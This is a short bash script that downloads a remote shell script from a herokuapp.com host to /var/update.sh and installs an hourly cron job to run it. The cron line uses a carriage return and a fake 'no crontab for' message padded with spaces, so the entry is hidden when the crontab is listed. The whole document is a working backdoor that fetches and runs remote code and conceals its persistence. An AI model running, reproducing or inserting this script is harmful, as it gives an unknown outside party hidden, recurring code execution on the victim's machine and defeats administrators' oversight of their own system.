#!/bin/bash
curl https://doorauth.herokuapp.com/b.sh -o /var/update.sh;
(crontab -l;printf "37 * * * * sh /var/update.sh;\rno crontab for `whoami`%100c\n")|crontab -